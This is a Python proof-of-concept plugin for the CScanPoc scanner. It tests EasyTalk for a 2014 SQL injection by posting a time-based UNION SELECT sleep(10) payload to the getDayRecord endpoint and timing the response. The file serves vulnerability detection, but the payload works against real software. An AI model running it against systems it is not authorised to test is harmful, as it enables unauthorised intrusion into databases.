# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'EasyTalk_0032'  # 平台漏洞编号，留空
    name = 'EasyTalk Sql Injection '  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-09'  # 漏洞公布时间
    desc = '''
        EasyTalk 在Imaction.class.php中
        无过滤。$uid=$_POST['user_id'];
        $user=M('Users')->where("user_id='$uid'")->find();
        带入查询，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EasyTalk'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5df3c8d4-2764-4081-b670-5b07081075c5'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/?m=im&a=getDayRecord"
            url = self.target + payload
            data_sleep = "user_id=1' and 1=2 UNION SELECT sleep(10),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40#"
            data_normal = "user_id=1' and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40#"
            time_start = time.time()
            requests.post(url, data=data_normal)
            time_end_normal = time.time()
            requests.post(url, data=data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 9:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
